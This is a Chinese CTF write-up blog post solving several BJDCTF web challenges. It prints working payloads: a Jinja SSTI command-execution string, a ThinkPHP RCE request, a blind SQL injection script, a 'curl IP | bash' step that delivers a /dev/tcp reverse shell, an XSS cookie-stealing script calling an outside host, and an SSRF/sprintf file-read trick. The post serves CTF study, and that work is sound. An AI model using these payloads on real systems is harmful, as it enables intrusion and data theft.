---
title: 第二届BJDCTFwp-web
date: 2020-03-21 14:48:08
updated: 2020-03-21 14:48:08
tags:
 - web
 - ctf
 - BDJCTF
 - 待补充
categories:
 - 刷题记录
---

## old-hack

打开后是一个谷歌的界面，随意输入数据后查看源码，提示SSTI

```html
<!--ssssssti & a little trick --> P3's girlfirend is : 1<br><hr>
```

测试过滤，非数字时{被过滤，使用url编码绕过即可

<!--more-->

```
paylaod:
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}

%7b%25%20%66%6f%72%20%63%20%69%6e%20%5b%5d%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%20%25%7d%7b%25%20%69%66%20%63%2e%5f%5f%6e%61%6d%65%5f%5f%3d%3d%27%63%61%74%63%68%5f%77%61%72%6e%69%6e%67%73%27%20%25%7d%7b%7b%20%63%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%27%5d%2e%65%76%61%6c%28%22%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%63%61%74%20%2f%66%6c%61%67%27%29%2e%72%65%61%64%28%29%22%29%20%7d%7d%7b%25%20%65%6e%64%69%66%20%25%7d%7b%25%20%65%6e%64%66%6f%72%20%25%7d

```

## old-hack

打开页面就提示powered by thinkphp

搜索漏洞

https://xz.aliyun.com/t/3845

直接利用

```http
POST /?s=captcha HTTP/1.1
Host: 733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn
Connection: close
Referer: http://733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn/?s=captcha
Upgrade-Insecure-Requests: 1

_method=__construct&filter%5B%5D=system&method=get&server%5BREQUEST_METHOD%5D=cat+%2Fflag
```



## 简单注入

测试发现过滤的单引号，select，但是有两个输入处，测试是盲注，可以转义一个单引号，然后注释一个单引号

```
payload：
username=admin\&password=or 0#
```

编写脚本

```python
import requests
import time
import string

def str2hex(strs):
    hexs='0x'
    for x in range(len(strs)):
        hexs+=hex(ord(strs[x]))[2:]
    # print(hexs)
    return hexs

def get(payload):
    url='http://d13d29d3-e336-4af5-adc9-6f48b9878152.node3.buuoj.cn'
    # print(url)

    data={
        'username':'1\\',
        'password': 'or '+payload+'#'
    }
    html = requests.post(url,data=data)
    # print(data)
    # print(html.text)
    return html

def binsea(s_payload,len=999):
    result = ''
    x=1
    while x <= len :
        error = 0
        left = 0
        right = 126
        while left <= right:
            mid = (left + right) / 2
            payload = "ascii(substr((%s),%d,1))>%d" % (s_payload,x, mid)
            # t1=time.time()
            res = get(payload)
            if res.status_code == 404 or res.status_code == 429:
                x=x-1
                error = 1
                break
            html=res.text
            # print(payload)
            if 'stronger' in html:
                left = mid +1
            else:
                right = mid -1
        mid = int((left + right + 1) / 2)
        if mid == 0 :
            break
        if error == 0 :
            result += chr(mid)
            print(result)
        x=x+1
    return result

def get_database():
    s_payload='database()'
    database = binsea(s_payload)
    # print(database)



def get_passwrod():
    s_payload='password'
    password=binsea(s_payload)
    return password


if __name__ == '__main__':
    # get_database() #p3rh4ps
    get_passwrod() #OhyOuFOuNdit
```

登入即可拿到flag



## duangShell

提示源码是swp文件，访问/.index.php.swp，然后恢复得到源码

```php+HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>give me a girl</title>
</head>
<body>
    <center><h1>珍爱网</h1></center>
</body>
</html>
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}

```

过滤了`/，>，\`不能直接反弹，但是可以使用curl、wget等其他命令来获取外部弹shell的命令，

将反弹shell命令写入文件index.php

```
bash -i >& /dev/tcp/host/port 0>&1
```

本地起一个web服务器,然后后台运行

```
php -S 0.0.0.0:80 &
nc -lvvp port
```

post数据

```
girl_friend=curl 174.1.75.158 | bash
```

即可收到shell

flag不在/flag中，然后找flag，grep能用，

```bash
bash-4.4$ grep -r "flag{" /etc
grep -r "flag{" /etc
grep: /etc/crontabs/root: Permission denied
grep: /etc/shadow: Permission denied
/etc/demo/P3rh4ps/love/you/flag:flag{6d6c7ac7-8d71-4e3e-a08d-9ba541ef6fa9}
grep: /etc/mysql/my.cnf: Permission denied
grep: /etc/shadow-: Permission denied

```







## Schrödinger

打开题目是一个爆破界面，说爆破的时间越久，成功率越大

查看源码，有一条隐藏的提示

```html
<h3><font color="white">Note : Remenmber to remove test.php!</font></h3>
```

输入

````url
http://be809d4c-8717-4842-bc82-61bf35da3a1d.node3.buuoj.cn/test.php
````

点击input

然后就开始爆破，发现是js写的，点击check，发现有cookie

```
 dXNlcg=MTU4MDMwODE2Ng==
```

base64解密后，发现是unix时间戳，把他改小，发现成功率变大，改成负数，直到成功率到100以上。点check

得到密码

```
Burst successed! The passwd is av11664517@1583985203.
```

根据提示

```
[hint for Schrödinger]
多注意cookie   	
最后密码是b站的av号 flag在b站上
```

访问

```
https://www.bilibili.com/video/av11664517
```

查看评论拿到flag



## 假猪套天下第一

打开是一个登入界面，除了admin都可以登录，登入会有跳转，抓包

发现最后有一个

```
<!-- L0g1n.php -->
```

于是访问`L0g1n.php`

根据提示修改http header

```http
GET /L0g1n.php HTTP/1.1
Host: node3.buuoj.cn:25033
User-Agent: Contiki/1.0 (Commodore 64;http://dunkels.com/adam/contiki/)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://node3.buuoj.cn:25033/
Connection: close
Client-ip: 127.0.0.1
From: root@gem-love.com
Referer: gem-love.com
Via: y1ng.vip
Cookie: PHPSESSID=4alc8h9smgnefqbeqd641mr7c1;time=158488078800
Upgrade-Insecure-Requests: 1

```

返回数据

```html
<html>
<head>
    <meta charset="gb2312">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>假猪套天下第一</title>
    <style>
        *{margin:0px; padding:0px;}
        .botCenter{width:100%; height:35px; line-height:35px; background:#DDA0DD; position:fixed; bottom:0px; left:0px; font-size:14px; color:#000; text-align:center;}
    </style>
</head>

<body bgcolor="#DDA0DD">
<center>
    <a href="https://gem-love.com/" target="_blank"><div class="botCenter">@颖奇L'Amore</div></a>
    <br><br><br><br><br><br><br><br>
    <font color=black size=32px>
        Sorry, even you are good at http header, you're still not my admin.<br> Althoungh u found me, u still dont know where is flag <!--ZmxhZ3s1NWU5ZWI3ZC1jYTIwLTQ4YzQtYWFmZC1iYTJlNmJmZDFmNzR9Cg==-->
```

将base64解密即可

## xss之光

.git泄露

```bash
dirb http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn CTF.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Mar 27 14:32:55 2020
URL_BASE: http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn/
WORDLIST_FILES: CTF.txt

-----------------

GENERATED WORDS: 52

---- Scanning URL: http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn/ ----
+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git (CODE:301|SIZE:185)
+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/index (CODE:200|SIZE:118)
+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/config (CODE:200|SIZE:137)
+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/ (CODE:403|SIZE:571)
                                                                               e.php.swp
-----------------
END_TIME: Fri Mar 27 14:32:57 2020
DOWNLOADED: 52 - FOUND: 4
```

利用githack得到源码

```php
//index.php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);

```

利用php原生类进行xss读取cookie

```PHP
<?php
$a = "<script src='http://1.1.1.1'+btoa(document.cookie)></script>";
echo urlencode(serialize($a));
```

本地cookie即可看见flag



## 文件探测

扫描发现有robots.txt

```
Disallow: /flag.php
Disallow: /admin.php
Allow: /index.php
```

http header有提示，访问home.php，url是下面这种形式，存在文件包含

```
/home.php?file=system
```

伪协议读文件

```php+HTML
//home.php
<?php

setcookie("y1ng", sha1(md5('y1ng')), time() + 3600);
setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);

if(isset($_GET['file'])){
    if (preg_match("/\^|\~|&|\|/", $_GET['file'])) {
        die("forbidden");
    }

    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
        die("not now!");
    }

    if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file'])){
        die("You! are! not! my! admin!");
    }

    if(preg_match("/^home$/i", $_GET['file'])){
        die("禁止套娃");
    }

    else{
        if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file'])){
            $file = $_GET['file'].".php";
        }
        else{
            $file = $_GET['file'].".fxxkyou!";
        }
        echo "现在访问的是 ".$file . "<br>";
        require $file;
    }
} else {
    echo "<script>location.href='./home.php?file=system'</script>";
}
```

```php+HTML
//system.php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '       Error:  url invalid<br>~$ ';
$str3 = '       Error:  damn hacker!<br>~$ ';
$str4 = '       Error:  request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">你知道目录下都有什么文件吗?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">请输入你想检测文件内容长度的url</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">你希望以何种方式访问？GET？POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">提交</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@颖奇L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);  //
    print(sprintf("$url method&content_size:$method%d", $detect));
}//sprintf(format,arg1,arg2,arg++) 函数把格式化的字符串写入一个变量中。 此处$detect是字符串,传入的$method包含%s即可得到文件源码

?>

```

```http
POST /system.php HTTP/1.1
Host: f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn
Connection: close
Referer: http://f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn/home.php?file=system
Cookie: y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e
Upgrade-Insecure-Requests: 1

q1=&q2=http%3A%2F%2F127.0.0.1%2Fadmin.php?&q3=POST%s%
```

```php
//admin.php
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}


?>
```

进行审计关键判断

```php
if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
}
```

$decr 来自于$_GET['decrypt']

$cipher来自aesEn($data, 'y1ng')函数加密后的结果

```php
function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}
```

而$data来自于$_SESSION['secret']

```php
mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
```

随机数种子破解不了，但是可以把$_SESSION删除，从而使得$data为空

再生成根据函数生成一个decrypt

```PHP
function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5("174.0.222.75",true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}
$cipher = aesEn('', 'y1ng');
echo $cipher;  //70klfZeYC+WlC045CcKhtg==

```

**注意`+`会被解析成空格，需要进行url编码**

```http
GET /admin.php?decrypt=70klfZeYC%2bWlC045CcKhtg== HTTP/1.1
Host: 983604da-0b56-4811-b6e1-e8d833daa7b3.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e
Upgrade-Insecure-Requests: 1
```

即可拿到flag



## elementmaster

官方放出提示

```
1. http://gem-love.com/em.txt
比赛最后1h冲分，hint太长公告写不下，点上面url查看
2.某处的神秘代码，Hex to String
```

查看源码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BJDCTF's Cute Caricature</title>
</head>
<body bgcolor=white>
<img src="mendeleev.jpg"></body>
<p hidden id="506F2E">I am the real Element Masterrr!!!!!!</p>
<p hidden id="706870">@颖奇L'Amore</p>
</body>
</html>
```

发现ID可疑，简ID解码后得到  Po.   和php，

访问得到一个   .    

根据提示访问元素周期表的页面，访问拼接得到

```php
# -*- coding: utf-8 -*-
# @Time    : 3/27/2020 3:57 PM
import time
import requests

strs = "H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue"

li = strs.replace(" ","").split(",")
url = 'http://7fa09155-1df7-469d-b620-9195f7a69f50.node3.buuoj.cn/'
temp = ''
for x in li:
    res = requests.get(url + x + '.php')
    if res.status_code != 200:
        continue
    temp += res.text
    print(temp)
            
            
#And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php            
```

访问即可得到flag



## EasyAspDotNet

